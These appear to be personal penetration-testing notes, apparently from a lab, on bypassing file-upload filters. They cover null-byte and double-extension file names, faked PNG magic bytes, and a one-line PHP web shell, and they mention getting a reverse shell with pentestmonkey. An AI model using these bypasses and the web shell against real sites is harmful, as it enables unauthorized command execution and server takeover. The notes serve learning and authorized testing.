
check the types of file that can be uploaded

only .jpg and .png allowed

**open network tab and see if any request going when you try to upload wrong type of file
if no request in network tab then file type checking done on client side 
else if any requests in network tab when we try to upload wrong type of file means checking done on server side**

**If checking done on client side, send correct file type, intercept the request, modify the file type and data and forward it and see if it is accepted**

![[Pasted image 20230716010709.png]]

![[Pasted image 20230716010632.png]]

this time it is not accepting the file if we intercept the request and change file type


we can try changing file name to

**logo.php%00.png
where %00 is nullbyte and it removes anything after it**

but it dosent work here

**sometime logo.php.png also works**

**Magic bytes are the first few bytes of the file that tell what kind of file it is. eg:**

![[Pasted image 20230716011133.png]]

this tells us it is a PNG file

**so get back original payload with the PNG files data and insert inside it**

```php
<?php system($_GET['cmd']) ?>
```

keep only PNG   magic byte and bit of starting and traling magic bytes
also change the filename to .php and try to upload

![[Pasted image 20230716183816.png]]

![[Pasted image 20230716183638.png]]



it is uploaded

![[Pasted image 20230716184000.png]]

can get reverse shell by uploading pentestmonkey

if some kind of file types upload are blocked google php file extensions and there are other extensions for same file types